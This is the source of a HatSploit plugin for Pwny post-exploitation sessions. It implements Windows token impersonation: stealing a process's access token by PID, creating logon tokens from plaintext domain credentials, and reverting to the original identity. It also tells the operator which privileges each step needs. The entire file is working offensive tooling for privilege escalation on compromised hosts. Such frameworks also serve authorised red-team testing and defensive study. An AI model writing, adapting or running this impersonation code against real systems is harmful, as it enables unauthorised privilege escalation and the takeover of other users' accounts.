"""
This plugin requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from badges.cmd import Command

from pwny.api import *
from pwny.types import *

from hatsploit.lib.core.plugin import Plugin


TOKEN_STEAL = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL)
TOKEN_REV2SELF = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL + 1)
TOKEN_MAKE = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL + 3)

TLV_TYPE_TOKEN_USER = tlv_custom_type(TLV_TYPE_STRING, TAB_BASE, API_TYPE)
TLV_TYPE_TOKEN_DOMAIN = tlv_custom_type(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 1)
TLV_TYPE_TOKEN_PASS = tlv_custom_type(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 2)


class HatSploitPlugin(Plugin):
    def __init__(self):
        super().__init__({
            'Name': "Token Plugin",
            'Plugin': "token",
            'Authors': [
                'EntySec - plugin developer',
            ],
            'Description': "Token impersonation — steal, create, and revert tokens.",
        })

        self.commands = [
            Command({
                'Category': "escalate",
                'Name': "steal_token",
                'Description': "Steal access token from a process and impersonate.",
                'MinArgs': 1,
                'Options': [
                    (
                        ('pid',),
                        {
                            'help': "PID of the process to steal token from.",
                            'type': int,
                        }
                    ),
                ]
            }),
            Command({
                'Category': "escalate",
                'Name': "make_token",
                'Description': "Create a logon token from plaintext credentials.",
                'MinArgs': 1,
                'Options': [
                    (
                        ('-d', '--domain'),
                        {
                            'help': "Domain name (use . for local).",
                            'required': True,
                        }
                    ),
                    (
                        ('-u', '--user'),
                        {
                            'help': "Username.",
                            'required': True,
                        }
                    ),
                    (
                        ('-p', '--password'),
                        {
                            'help': "Password.",
                            'required': True,
                        }
                    ),
                ]
            }),
            Command({
                'Category': "escalate",
                'Name': "rev2self",
                'Description': "Revert to original process token (undo steal_token/getsystem).",
            }),
        ]

    def steal_token(self, args):
        self.print_process(f"Stealing token from PID {args.pid}...")

        result = self.session.send_command(
            tag=TOKEN_STEAL,
            plugin=self.plugin,
            args={
                TLV_TYPE_PID: args.pid,
            }
        )

        if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error(
                "Failed to steal token! "
                "Need SeDebugPrivilege or admin context."
            )
            return

        user = result.get_string(TLV_TYPE_TOKEN_USER)
        if user:
            self.print_success(f"Now impersonating: {user}")
        else:
            self.print_success("Token stolen successfully.")

    def make_token(self, args):
        self.print_process(
            f"Creating logon token for {args.domain}\\{args.user}..."
        )

        result = self.session.send_command(
            tag=TOKEN_MAKE,
            plugin=self.plugin,
            args={
                TLV_TYPE_TOKEN_DOMAIN: args.domain,
                TLV_TYPE_TOKEN_USER: args.user,
                TLV_TYPE_TOKEN_PASS: args.password,
            }
        )

        if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error(
                "Failed to create token! Check credentials and ensure "
                "you have SeTcbPrivilege or admin rights."
            )
            return

        user = result.get_string(TLV_TYPE_TOKEN_USER)
        if user:
            self.print_success(f"Now impersonating: {user}")
        else:
            self.print_success("Token created successfully.")

        self.print_information(
            "Use 'rev2self' to revert to original identity."
        )

    def rev2self(self, _):
        result = self.session.send_command(
            tag=TOKEN_REV2SELF,
            plugin=self.plugin,
        )

        if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error("Failed to revert to self!")
            return

        self.print_success("Reverted to original process token.")

    def load(self):
        pass
